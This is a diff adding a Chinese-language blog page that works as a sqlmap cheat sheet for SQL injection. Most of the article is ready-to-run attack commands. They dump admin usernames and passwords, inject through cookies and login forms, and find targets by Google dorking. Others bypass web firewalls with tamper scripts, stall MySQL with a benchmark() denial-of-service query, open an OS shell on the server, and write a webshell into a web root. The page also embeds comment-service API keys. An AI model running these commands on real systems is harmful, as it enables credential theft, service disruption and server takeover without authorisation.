@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap的基本使用">
+<meta property="og:url" content="http://mysecroad.github.io/posts/8141.html">
+<meta property="og:site_name" content="忆时光">
+<meta property="og:description" content="前言sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-03-29T12:05:23.000Z">
+<meta property="article:modified_time" content="2019-08-19T07:55:00.000Z">
+<meta property="article:author" content="ca5tle">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>sqlmap的基本使用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/3072.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/52358.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://mysecroad.github.io/posts/8141.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://mysecroad.github.io/posts/8141.html&text=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://mysecroad.github.io/posts/8141.html&is_video=false&description=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqlmap的基本使用&body=Check out this article: http://mysecroad.github.io/posts/8141.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://mysecroad.github.io/posts/8141.html&name=sqlmap的基本使用&description=&lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。&lt;/p&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://mysecroad.github.io/posts/8141.html&t=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一共有11种常见SQLmap使用方法："><span class="toc-number">2.</span> <span class="toc-text">一共有11种常见SQLmap使用方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLmap用于Access数据库注入"><span class="toc-number">2.1.</span> <span class="toc-text">SQLmap用于Access数据库注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP用于Cookie注入"><span class="toc-number">2.2.</span> <span class="toc-text">SQLMAP用于Cookie注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP用于mysql中DDOS攻击"><span class="toc-number">2.3.</span> <span class="toc-text">SQLMAP用于mysql中DDOS攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP用于mysql注入"><span class="toc-number">2.4.</span> <span class="toc-text">SQLMAP用于mysql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP中post登陆框注入"><span class="toc-number">2.5.</span> <span class="toc-text">SQLMAP中post登陆框注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件"><span class="toc-number">2.5.1.</span> <span class="toc-text">其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#自动的搜索"><span class="toc-number">2.5.2.</span> <span class="toc-text">自动的搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指定参数搜索"><span class="toc-number">2.5.3.</span> <span class="toc-text">指定参数搜索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP中Google搜索注入"><span class="toc-number">2.6.</span> <span class="toc-text">SQLMAP中Google搜索注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP中的请求延迟"><span class="toc-number">2.7.</span> <span class="toc-text">SQLMAP中的请求延迟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP绕过WAF防火墙"><span class="toc-number">2.8.</span> <span class="toc-text">SQLMAP绕过WAF防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP查看权限"><span class="toc-number">2.9.</span> <span class="toc-text">SQLMAP查看权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP伪静态注入"><span class="toc-number">2.10.</span> <span class="toc-text">SQLMAP伪静态注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP注入点执行命令与交互写shell"><span class="toc-number">2.11.</span> <span class="toc-text">SQLMAP注入点执行命令与交互写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#示例："><span class="toc-number">2.11.1.</span> <span class="toc-text">示例：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap详细命令："><span class="toc-number">3.</span> <span class="toc-text">sqlmap详细命令：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        sqlmap的基本使用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ca5tle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-29T12:05:23.000Z" itemprop="datePublished">2019-03-29</time>
+        
+        (Updated: <time datetime="2019-08-19T07:55:00.000Z" itemprop="dateModified">2019-08-19</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="tag-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。</p>
+<a id="more"></a>
+<h1 id="一共有11种常见SQLmap使用方法："><a href="#一共有11种常见SQLmap使用方法：" class="headerlink" title="一共有11种常见SQLmap使用方法："></a>一共有11种常见SQLmap使用方法：</h1><h2 id="SQLmap用于Access数据库注入"><a href="#SQLmap用于Access数据库注入" class="headerlink" title="SQLmap用于Access数据库注入"></a>SQLmap用于Access数据库注入</h2><ul>
+<li><p>猜解是否能注入<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</code></p>
+</li>
+<li><p>猜解表<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables</code></p>
+</li>
+<li><p>根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin</code></p>
+</li>
+<li><p>根据字段猜解内容(假如通过3得到字段为username和password)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot;</code></p>
+</li>
+</ul>
+<h2 id="SQLMAP用于Cookie注入"><a href="#SQLMAP用于Cookie注入" class="headerlink" title="SQLMAP用于Cookie注入"></a>SQLMAP用于Cookie注入</h2><ul>
+<li><p>cookie注入，猜解表<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2</code></p>
+</li>
+<li><p>猜解字段，(通过1的表猜解字段，假如表为admin)<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2</code></p>
+</li>
+<li><p>猜解内容<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T
+admin -C &quot;username,password&quot; --level 2</code></p>
+</li>
+</ul>
+<h2 id="SQLMAP用于mysql中DDOS攻击"><a href="#SQLMAP用于mysql中DDOS攻击" class="headerlink" title="SQLMAP用于mysql中DDOS攻击"></a>SQLMAP用于mysql中DDOS攻击</h2><ul>
+<li><p>获取一个Shell<br><code>python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell</code></p>
+</li>
+<li><p>输入执行语句完成DDOS攻击<br><code>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</code></p>
+</li>
+</ul>
+<h2 id="SQLMAP用于mysql注入"><a href="#SQLMAP用于mysql注入" class="headerlink" title="SQLMAP用于mysql注入"></a>SQLMAP用于mysql注入</h2><ul>
+<li><p>查找数据库<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs</code></p>
+</li>
+<li><p>通过第一步的数据库查找表(假如数据库名为dataname)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables</code></p>
+</li>
+<li><p>通过2中的表得出列名(假如表为table_name)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns</code></p>
+</li>
+<li><p>获取字段的值(假如扫描出id,user,password字段)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C
+&quot;id,user,password&quot; --dump</code></p>
+</li>
+</ul>
+<h2 id="SQLMAP中post登陆框注入"><a href="#SQLMAP中post登陆框注入" class="headerlink" title="SQLMAP中post登陆框注入"></a>SQLMAP中post登陆框注入</h2><h3 id="其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件"><a href="#其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件" class="headerlink" title="其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件"></a>其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</h3><p>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
+<ol>
+<li><p>浏览器打开目标地址http:// <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> /Login.asp</p>
+</li>
+<li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p>
+</li>
+<li><p>点击login表单的submit按钮</p>
+</li>
+<li><p>这时候Burp会拦截到了我们的登录POST请求</p>
+</li>
+<li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
+</li>
+<li><p>运行sqlmap并使用如下命令：<br><code>./sqlmap.py -r search-test.txt -p tfUPass</code></p>
+</li>
+</ol>
+<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
+<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp</a></p>
+<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
+<h3 id="自动的搜索"><a href="#自动的搜索" class="headerlink" title="自动的搜索"></a>自动的搜索</h3><p><code>sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms</code></p>
+<h3 id="指定参数搜索"><a href="#指定参数搜索" class="headerlink" title="指定参数搜索"></a>指定参数搜索</h3><p><code>sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data &quot;tfUName=321&amp;tfUPass=321&quot;</code></p>
+<h2 id="SQLMAP中Google搜索注入"><a href="#SQLMAP中Google搜索注入" class="headerlink" title="SQLMAP中Google搜索注入"></a>SQLMAP中Google搜索注入</h2><p>inurl后面的语言是由自己定的<br>注入过程中如果选y是注入，如果不是选n</p>
+<p><code>sqlmap -g inurl:php?id=</code></p>
+<h2 id="SQLMAP中的请求延迟"><a href="#SQLMAP中的请求延迟" class="headerlink" title="SQLMAP中的请求延迟"></a>SQLMAP中的请求延迟</h2><p>参数 –delay –safe-freq</p>
+<p><code>python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1</code></p>
+<p><code>python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</code></p>
+<h2 id="SQLMAP绕过WAF防火墙"><a href="#SQLMAP绕过WAF防火墙" class="headerlink" title="SQLMAP绕过WAF防火墙"></a>SQLMAP绕过WAF防火墙</h2><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a></p>
+<p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</code></p>
+<p><code>space2morehash.py</code>中可以替换<code>space2hash.py</code>或者<code>base64encode.py</code>或者<code>charencode.py</code>都是编码方式</p>
+<h2 id="SQLMAP查看权限"><a href="#SQLMAP查看权限" class="headerlink" title="SQLMAP查看权限"></a>SQLMAP查看权限</h2><p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --privileges</code></p>
+<h2 id="SQLMAP伪静态注入"><a href="#SQLMAP伪静态注入" class="headerlink" title="SQLMAP伪静态注入"></a>SQLMAP伪静态注入</h2><ul>
+<li><p>查找数据库<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs</code></p>
+</li>
+<li><p>通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables</code></p>
+</li>
+<li><p>通过2中的数据表得到字段(假如得到的是tablename表)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
+tablename --columns</code></p>
+</li>
+<li><p>通过3得到字段值(假如从3中得到字段id，password)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
+tablename -C &quot;password&quot; --dump</code></p>
+</li>
+</ul>
+<h2 id="SQLMAP注入点执行命令与交互写shell"><a href="#SQLMAP注入点执行命令与交互写shell" class="headerlink" title="SQLMAP注入点执行命令与交互写shell"></a>SQLMAP注入点执行命令与交互写shell</h2><ul>
+<li><p>注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br>此处采用的是Linux系统<br><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig</code><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/ </p>
+</li>
+<li><p>获取Shell<br><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell</code><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/<br>输入ipconfig/all<br>创建用户和删除用户<br>只要权限足够大，你可以输入使用任何命令。<br>其他命令参考下面：<br>从数据库中搜索字段<br><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</code></p>
+</li>
+</ul>
+<p>在dedecms数据库中搜索字段<code>admin</code>或者<code>password</code>。</p>
+<p>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。<br><code>–file-read=RFILE</code> 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p><code>–file-write=WFILE</code> 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p><code>–file-dest=DFILE</code> 后端的数据库管理系统写入文件的绝对路径</p>
+<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p><code>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</code></p>
+<p>使用shell命令：<br><code>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</code></p>
+<p>接下来指定网站可写目录：<br><code>“E:\php\htdocs\dvwa”</code></p>
+<ul>
+<li>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</li>
+</ul>
+<h1 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h1><ul>
+<li><p>-is-dba 当前用户权限（是否为root权限）</p>
+</li>
+<li><p>-dbs 所有数据库</p>
+</li>
+<li><p>-current-db 网站当前数据库</p>
+</li>
+<li><p>-users 所有数据库用户</p>
+</li>
+<li><p>-current-user 当前数据库用户</p>
+</li>
+<li><p>-random-agent 构造随机user-agent</p>
+</li>
+<li><p>-passwords 数据库密码</p>
+</li>
+<li><p>-proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</p>
+</li>
+<li><p>-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
+            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一共有11种常见SQLmap使用方法："><span class="toc-number">2.</span> <span class="toc-text">一共有11种常见SQLmap使用方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLmap用于Access数据库注入"><span class="toc-number">2.1.</span> <span class="toc-text">SQLmap用于Access数据库注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP用于Cookie注入"><span class="toc-number">2.2.</span> <span class="toc-text">SQLMAP用于Cookie注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP用于mysql中DDOS攻击"><span class="toc-number">2.3.</span> <span class="toc-text">SQLMAP用于mysql中DDOS攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP用于mysql注入"><span class="toc-number">2.4.</span> <span class="toc-text">SQLMAP用于mysql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP中post登陆框注入"><span class="toc-number">2.5.</span> <span class="toc-text">SQLMAP中post登陆框注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件"><span class="toc-number">2.5.1.</span> <span class="toc-text">其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#自动的搜索"><span class="toc-number">2.5.2.</span> <span class="toc-text">自动的搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指定参数搜索"><span class="toc-number">2.5.3.</span> <span class="toc-text">指定参数搜索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP中Google搜索注入"><span class="toc-number">2.6.</span> <span class="toc-text">SQLMAP中Google搜索注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP中的请求延迟"><span class="toc-number">2.7.</span> <span class="toc-text">SQLMAP中的请求延迟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP绕过WAF防火墙"><span class="toc-number">2.8.</span> <span class="toc-text">SQLMAP绕过WAF防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP查看权限"><span class="toc-number">2.9.</span> <span class="toc-text">SQLMAP查看权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP伪静态注入"><span class="toc-number">2.10.</span> <span class="toc-text">SQLMAP伪静态注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP注入点执行命令与交互写shell"><span class="toc-number">2.11.</span> <span class="toc-text">SQLMAP注入点执行命令与交互写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#示例："><span class="toc-number">2.11.1.</span> <span class="toc-text">示例：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap详细命令："><span class="toc-number">3.</span> <span class="toc-text">sqlmap详细命令：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://mysecroad.github.io/posts/8141.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://mysecroad.github.io/posts/8141.html&text=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://mysecroad.github.io/posts/8141.html&is_video=false&description=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqlmap的基本使用&body=Check out this article: http://mysecroad.github.io/posts/8141.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://mysecroad.github.io/posts/8141.html&title=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://mysecroad.github.io/posts/8141.html&name=sqlmap的基本使用&description=&lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。&lt;/p&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://mysecroad.github.io/posts/8141.html&t=sqlmap的基本使用" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
